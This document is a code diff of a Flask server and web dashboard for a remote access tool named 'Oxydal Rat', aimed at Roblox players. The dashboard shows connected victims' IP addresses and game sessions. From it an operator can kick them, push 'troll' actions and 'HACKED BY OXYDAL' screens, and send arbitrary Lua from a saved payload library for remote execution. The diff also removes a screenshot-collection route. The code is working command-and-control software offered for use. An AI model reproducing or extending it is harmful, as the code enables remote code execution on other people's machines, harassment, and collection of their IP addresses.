@@ -12,8 +12,7 @@ app = Flask(__name__)
 app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# === CONFIG ===
-ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}  # Change avec ton IP
+ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
 
@@ -21,9 +20,8 @@ connected_players = {}
 pending_kicks = {}
 pending_commands = {}
 history_log = []
-payloads = []
+payloads = {}
 
-# === CHARGEMENT DES FICHIERS ===
 def load_history():
     global history_log
     if os.path.exists(HISTORY_FILE):
@@ -49,7 +47,6 @@ def save_payloads():
 load_history()
 load_payloads()
 
-# === SÉCURITÉ IP ===
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
@@ -66,14 +63,12 @@ def access_denied(e):
 
 @app.before_request
 def protect_routes():
-    if request.path in ["/", "/kick", "/troll", "/payload", "/screenshot"] or request.path.startswith("/api"):
+    if request.path in ["/", "/kick", "/troll", "/payload"] or request.path.startswith("/api"):
         check_ip()
 
-# === HISTORIQUE ===
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
-    entry = {"time": timestamp, "type": event_type, "username": username, "details": details}
-    history_log.insert(0, entry)
+    history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
     if len(history_log) > 100: history_log.pop()
     try:
         with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
@@ -81,18 +76,17 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# === PAGE PRINCIPALE (HTML + CSS + JS COMPLET) ===
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
 <meta charset="UTF-8">
 <title>Oxydal Rat — Wave Theme</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&family=Orbitron:wght@700&family=Press+Start+2P&family=Creepster&family=Bangers&family=Nosifer&family=Monoton&family=Audiowide&family=Wallpoet&family=VT323&family=Share+Tech+Mono&family=Exo+2:wght@700&family=Rajdhani:wght@600&family=Anton&family=Bebas+Neue&family=Righteous&family=Russo+One&family=Staatliches&family=Teko:wght@600&family=Fredoka+One&family=Pacifico&family=Lobster&family=Dancing+Script:wght@700&family=Caveat&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
     :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;}
     *{margin:0;padding:0;box-sizing:border-box;}
-    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;}
+    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
     .header{position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between;}
     .logo{display:flex;align-items:center;gap:12px;font-weight:700;font-size:1.5rem;}
     .logo svg{width:40px;height:40px;fill:var(--primary);}
@@ -125,16 +119,15 @@ HTML = """<!DOCTYPE html>
     .btn:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
     .btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);}
     .btn.undo{background:#475569;}
-    .btn.screenshot{background:linear-gradient(135deg,#8b5cf6,#7c3aed);}
-    .screenshots{margin-top:40px;padding:20px;background:#1e293b;border-radius:16px;}
-    .screenshot-entry{margin:15px 0;padding:10px;background:#0f172a;border-radius:12px;}
-    .screenshot-entry img{max-width:100%;border:2px solid #06b6d4;border-radius:12px;}
     .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:2000;align-items:center;justify-content:center;}
     .modal.active{display:flex;}
     .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:700px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
     .modal-content h2{color:var(--primary);margin-bottom:1rem;text-align:center;font-size:1.6rem;}
     input,textarea,select{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;}
-    .font-preview{font-family:var(--preview-font,'Inter');font-size:80px;color:var(--preview-color,#06b6d4);margin:20px 0;padding:10px;background:#0f172a;border-radius:8px;text-align:center;}
+    .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
+    .payload-item{cursor:pointer;padding:10px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:all .2s;}
+    .payload-item:hover{background:#334155;}
+    .payload-item.selected{background:var(--primary);color:black;}
     .modal-buttons{display:flex;gap:1rem;}
     .modal-btn{flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;transition:all .3s;}
     .confirm{background:var(--primary);color:white;}
@@ -143,10 +136,6 @@ HTML = """<!DOCTYPE html>
     .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;}
     .toast{background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:slideIn .4s;}
     @keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
-    .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
-    .payload-item{cursor:pointer;padding:10px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:all .2s;}
-    .payload-item:hover{background:#334155;}
-    .payload-item.selected{background:var(--primary);color:black;}
 </style>
 </head>
 <body>
@@ -176,52 +165,18 @@ HTML = """<!DOCTYPE html>
             <div id="payloads-list"></div>
         </div>
         <div id="history-tab" class="tab" style="display:none;"><div id="history"></div></div>
-
-        <div class="screenshots">
-            <h2 style="color:#06b6d4;margin-bottom:20px;">Screenshots reçus</h2>
-            <div id="screenshotList"></div>
-        </div>
     </div>
 </div>
 
-<!-- TextScreen Modal -->
-<div class="modal" id="textScreenModal"><div class="modal-content">
-    <h2>Display Text Screen</h2>
-    <input type="text" id="screenText" placeholder="Enter text" value="HACKED BY OXYDAL">
-    <label style="color:#94a3b8;font-size:0.9rem;">Font</label>
-    <select id="textFont">
-        <option value="Arial">Arial</option>
-        <option value="Orbitron">Orbitron</option>
-        <option value="Press Start 2P">Press Start 2P</option>
-        <option value="Creepster">Creepster</option>
-        <option value="Bangers">Bangers</option>
-        <option value="Nosifer">Nosifer</option>
-        <option value="Monoton">Monoton</option>
-        <option value="Audiowide">Audiowide</option>
-        <option value="VT323">VT323</option>
-        <option value="Bebas Neue">Bebas Neue</option>
-        <option value="Righteous">Righteous</option>
-        <option value="Pacifico">Pacifico</option>
-        <option value="Lobster">Lobster</option>
-        <option value="Dancing Script">Dancing Script</option>
-    </select>
-    <label style="color:#94a3b8;font-size:0.9rem;">Color</label>
-    <input type="color" id="textColor" value="#00ff00">
-    <label style="color:#94a3b8;font-size:0.9rem;">Size (10-200)</label>
-    <input type="range" id="textSize" min="10" max="200" value="97">
-    <div class="font-preview" id="fontPreview">Preview Text</div>
-    <div class="modal-buttons">
-        <button class="modal-btn cancel">Cancel</button>
-        <button class="modal-btn confirm" id="confirmText">Display Text</button>
-    </div>
-</div></div>
-
-<!-- Autres modals -->
+<!-- Modals -->
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
+<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
 <div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
 <div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Create Payload</h2><input type="text" id="payloadName" placeholder="Payload name"><textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="savePayload">Save</button></div></div></div>
+
+<!-- Modal Import Payload avec recherche + édition -->
 <div class="modal" id="executePayloadModal"><div class="modal-content">
     <h2>Import & Edit Payload</h2>
     <div class="search-bar"><input type="text" id="payloadSearch" placeholder="Search payload by name..." onkeyup="filterPayloads()"></div>
@@ -237,7 +192,9 @@ HTML = """<!DOCTYPE html>
 
 <script>
 const socket = io();
-let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null;
+let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
+let editingPayload = null;
+let selectedPayloadName = null;
 
 // Navigation
 document.querySelectorAll('.nav-item').forEach(item => {
@@ -256,6 +213,7 @@ function toast(msg) {
     setTimeout(() => t.remove(), 4000);
 }
 
+// Recherche joueurs
 function filterPlayers() {
     const query = document.getElementById("searchInput").value.toLowerCase();
     document.querySelectorAll('.card').forEach(card => {
@@ -264,52 +222,11 @@ function filterPlayers() {
     });
 }
 
-// TextScreen Preview
-function updatePreview() {
-    const text = document.getElementById("screenText").value || "Preview Text";
-    const font = document.getElementById("textFont").value;
-    const color = document.getElementById("textColor").value;
-    const size = document.getElementById("textSize").value;
-    const preview = document.getElementById("fontPreview");
-    preview.textContent = text;
-    preview.style.fontFamily = font;
-    preview.style.color = color;
-    preview.style.fontSize = size + "px";
-}
-document.getElementById("screenText").addEventListener("input", updatePreview);
-document.getElementById("textFont").addEventListener("change", updatePreview);
-document.getElementById("textColor").addEventListener("input", updatePreview);
-document.getElementById("textSize").addEventListener("input", updatePreview);
-
-document.getElementById("confirmText").addEventListener("click", () => {
-    const text = document.getElementById("screenText").value.trim();
-    if (!text) return toast("Enter text");
-    const payload = JSON.stringify({
-        styled: true,
-        text: text,
-        font: document.getElementById("textFont").value,
-        color: document.getElementById("textColor").value,
-        size: parseInt(document.getElementById("textSize").value)
-    });
-    sendTroll(currentTextId, "textscreen", payload);
-    document.getElementById("textScreenModal").classList.remove("active");
-});
-
-function openTextScreenModal(id){
-    currentTextId = id;
-    document.getElementById("screenText").value = "HACKED BY OXYDAL";
-    document.getElementById("textFont").value = "Pacifico";
-    document.getElementById("textColor").value = "#00ff00";
-    document.getElementById("textSize").value = 97;
-    updatePreview();
-    document.getElementById("textScreenModal").classList.add("active");
-}
-
-// Payloads
+// Workshop
 function loadPayloads() {
     fetch("/payload?action=list").then(r => r.json()).then(data => {
         const list = document.getElementById("payloads-list");
-        list.innerHTML = Object.keys(data).length === 0 ? "<p style='color:#94a3b8'>Aucun payload. Crée-en un !</p>" : "";
+        list.innerHTML = Object.keys(data).length === 0 ? "<p style='color:#94a3b8'>No payload yet. Create one!</p>" : "";
         for (const [name, code] of Object.entries(data)) {
             const div = document.createElement("div");
             div.className = "payload-item";
@@ -321,45 +238,126 @@ function loadPayloads() {
     });
 }
 
-function renderHistory(data) {
-    document.getElementById("history").innerHTML = data.history.map(h => 
-        `<div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`
-    ).join('');
-}
-
-function sendTroll(id, cmd, param = null) {
-    const body = { userid: id, cmd };
-    if (param) {
-        if (cmd === "playsound") body.assetId = param;
-        else if (cmd === "textscreen") body.text = param;
-        else if (cmd === "luaexec") body.script = param;
-    }
-    fetch("/troll", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
-    toast(cmd.toUpperCase() + " envoyé");
-}
-
-socket.on("new_screenshot", data => {
-    const div = document.createElement("div");
-    div.className = "screenshot-entry";
-    div.innerHTML = `<strong>[${data.time}] ${data.username} (${data.userid})</strong><br><img src="${data.image}" alt="screenshot">`;
-    document.getElementById("screenshotList").prepend(div);
-    toast("Screenshot reçu !");
+document.getElementById("newPayloadBtn").addEventListener("click", () => {
+    editingPayload = null;
+    document.getElementById("payloadModalTitle").textContent = "Create Payload";
+    document.getElementById("payloadName").value = "";
+    document.getElementById("payloadCode").value = "";
+    document.getElementById("payloadModal").classList.add("active");
 });
 
-function render(data) {
-    document.getElementById("stats").innerText = data.online;
-    const grid = document.getElementById("players");
-    const currentIds = new Set(Object.keys(data.players));
-    Object.entries(data.players).forEach(([id, p]) => {
-        let card = document.getElementById(`card_${id}`);
-        if (!card) {
-            card = document.createElement("div");
-            card.className = "card";
-            card.id = `card_${id}`;
-            grid.appendChild(card);
+window.editPayload = function(name) {
+    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
+        editingPayload = name;
+        document.getElementById("payloadModalTitle").textContent = "Edit Payload";
+        document.getElementById("payloadName").value = name;
+        document.getElementById("payloadCode").value = d.code;
+        document.getElementById("payloadModal").classList.add("active");
+    });
+};
+
+window.deletePayload = function(name) {
+    if (confirm("Delete payload " + name + " ?")) {
+        fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({action:"delete",name})})
+            .then(() => { toast("Payload deleted"); loadPayloads(); });
+    }
+};
+
+document.getElementById("savePayload").addEventListener("click", () => {
+    const name = document.getElementById("payloadName").value.trim();
+    const code = document.getElementById("payloadCode").value;
+    if (!name || !code) return toast("Name and code required");
+    fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({action: editingPayload ? "update" : "create", name, code, oldname: editingPayload})
+    }).then(() => {
+        toast(editingPayload ? "Payload updated" : "Payload created");
+        document.getElementById("payloadModal").classList.remove("active");
+        loadPayloads();
+    });
+});
+
+// Import Payload avec recherche + édition
+window.openPayloadSelector = function(id) {
+    currentLuaId = id;
+    fetch("/payload?action=list").then(r => r.json()).then(data => {
+        const list = document.getElementById("payloadList");
+        list.innerHTML = "";
+        if (Object.keys(data).length === 0) {
+            list.innerHTML = "<p style='color:#94a3b8;text-align:center'>No payload available</p>";
+        } else {
+            for (const name of Object.keys(data)) {
+                const item = document.createElement("div");
+                item.className = "payload-item";
+                item.textContent = name;
+                item.onclick = () => {
+                    document.querySelectorAll('#payloadList .payload-item').forEach(i => i.classList.remove('selected'));
+                    item.classList.add('selected');
+                    selectedPayloadName = name;
+                    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
+                        document.getElementById("tempPayloadCode").value = d.code;
+                    });
+                };
+                list.appendChild(item);
+            }
         }
-        card.innerHTML = `
-            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
+        document.getElementById("tempPayloadCode").value = "";
+        document.getElementById("payloadSearch").value = "";
+        document.getElementById("executePayloadModal").classList.add("active");
+    });
+};
+
+function filterPayloads() {
+    const query = document.getElementById("payloadSearch").value.toLowerCase();
+    document.querySelectorAll('#payloadList .payload-item').forEach(item => {
+        item.style.display = item.textContent.toLowerCase().includes(query) ? "block" : "none";
+    });
+}
+
+document.getElementById("executeTempPayload").addEventListener("click", () => {
+    const code = document.getElementById("tempPayloadCode").value.trim();
+    if (!code) return toast("No code to execute");
+    if (!currentLuaId) return toast("No player selected");
+    sendTroll(currentLuaId, "luaexec", code);
+    document.getElementById("executePayloadModal").classList.remove("active");
+});
+
+// Fonctions classiques
+function openKickModal(id){currentKickId=id;document.getElementById("kickModal").classList.add("active");document.getElementById("kickReason").focus();}
+function openPlaySoundModal(id){currentSoundId=id;document.getElementById("playSoundModal").classList.add("active");}
+function openTextScreenModal(id){currentTextId=id;document.getElementById("textScreenModal").classList.add("active");}
+function openLuaExecModal(id){currentLuaId=id;document.getElementById("luaExecModal").classList.add("active");}
+function openImportFileModal(id){currentImportId=id;document.getElementById("importFileModal").classList.add("active");}
+
+document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener("click", () => b.closest('.modal').classList.remove("active")));
+
+function sendTroll(id,cmd,param=null){
+    const body={userid:id,cmd};
+    if(param){if(cmd==="playsound")body.assetId=param;else if(cmd==="textscreen")body.text=param;else if(cmd==="luaexec")body.script=param;}
+    fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
+    toast(cmd.toUpperCase()+" sent");
+}
+
+document.getElementById("confirmKick").addEventListener("click",()=>{const r=document.getElementById("kickReason").value.trim()||"Kicked by admin";fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:r})});toast("KICK sent");document.getElementById("kickModal").classList.remove("active");});
+document.getElementById("confirmSound").addEventListener("click",()=>{const a=document.getElementById("soundAssetId").value.trim();if(a)sendTroll(currentSoundId,"playsound",a);document.getElementById("playSoundModal").classList.remove("active");});
+document.getElementById("confirmText").addEventListener("click",()=>{const t=document.getElementById("screenText").value.trim();if(t)sendTroll(currentTextId,"textscreen",t);document.getElementById("textScreenModal").classList.remove("active");});
+document.getElementById("confirmLua").addEventListener("click",()=>{const s=document.getElementById("luaScript").value.trim();if(s)sendTroll(currentLuaId,"luaexec",s);document.getElementById("luaExecModal").classList.remove("active");});
+document.getElementById("confirmImport").addEventListener("click",()=>{
+    const f=document.getElementById("luaFileInput").files[0];
+    if(!f)return toast("Select a file");
+    const r=new FileReader();
+    r.onload=e=>{sendTroll(currentImportId,"luaexec",e.target.result);document.getElementById("importFileModal").classList.remove("active");document.getElementById("luaFileInput").value="";};
+    r.readAsText(f);
+});
+
+function render(data){
+    document.getElementById("stats").innerText=data.online;
+    const grid=document.getElementById("players");
+    const currentIds=new Set(Object.keys(data.players));
+    Object.entries(data.players).forEach(([id,p])=>{
+        let card=document.getElementById(`card_${id}`);
+        if(!card){card=document.createElement("div");card.className="card";card.id=`card_${id}`;grid.appendChild(card);}
+        card.innerHTML=`
+            <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
             <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId || "N/A"}</div>
 
@@ -374,7 +372,6 @@ function render(data) {
                 <button class="btn" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                 <button class="btn" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                 <button class="btn" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
-                <button class="btn screenshot" onclick="sendTroll('${id}','screenshot')">SCREENSHOT</button>
             </div>
 
             <div class="category">UNDO</div>
@@ -395,19 +392,22 @@ function render(data) {
             </div>
         `;
     });
-    document.querySelectorAll('.card').forEach(c => {
-        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
-    });
+    document.querySelectorAll('.card').forEach(c=>{if(!currentIds.has(c.id.replace('card_','')))c.remove();});
+}
+
+function renderHistory(data){
+    document.getElementById("history").innerHTML = data.history.map(h=>`<div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`).join('');
 }
 
 socket.on("update", render);
 socket.on("history_update", renderHistory);
 socket.on("kick_notice", d => toast(d.username + " → " + d.reason));
-fetch("/get_history").then(r => r.json()).then(renderHistory);
+fetch("/get_history").then(r=>r.json()).then(renderHistory);
 </script>
 </body>
 </html>"""
 
+# === Routes (inchangées) ===
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -474,40 +474,20 @@ def troll():
     if uid and cmd:
         cmd_data = {"cmd": cmd}
         details = f"{cmd.upper()}"
-        if cmd == "screenshot":
-            details = "SCREENSHOT demandé"
-        elif "assetId" in data:
+        if "assetId" in data:
             cmd_data["assetId"] = data["assetId"]
             details += f" (Asset: {data['assetId']})"
         elif "text" in data:
             cmd_data["text"] = data["text"]
-            details += " (Styled Text)"
+            details += f" (Text: {data['text']})"
         elif "script" in data:
             cmd_data["script"] = data["script"]
             details += f" (Script: {len(data['script'])} chars)"
         pending_commands[uid] = cmd_data
         name = connected_players.get(uid, {}).get("username", "Unknown")
         add_history("action", name, details)
+        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
-
-@app.route("/screenshot", methods=["POST"])
-def receive_screenshot():
-    check_ip()
-    data = request.get_json() or {}
-    userid = data.get("userid", "unknown")
-    username = data.get("username", "unknown")
-    image_url = data.get("image", "")
-
-    if image_url and image_url.startswith("rbxthumb://"):
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        socketio.emit("new_screenshot", {
-            "time": timestamp,
-            "username": username,
-            "userid": userid,
-            "image": image_url
-        })
-        add_history("screenshot", username, "Screenshot reçu")
-    return jsonify({"ok": True})
 
 @app.route("/payload", methods=["GET", "POST"])
 def payload_manager():
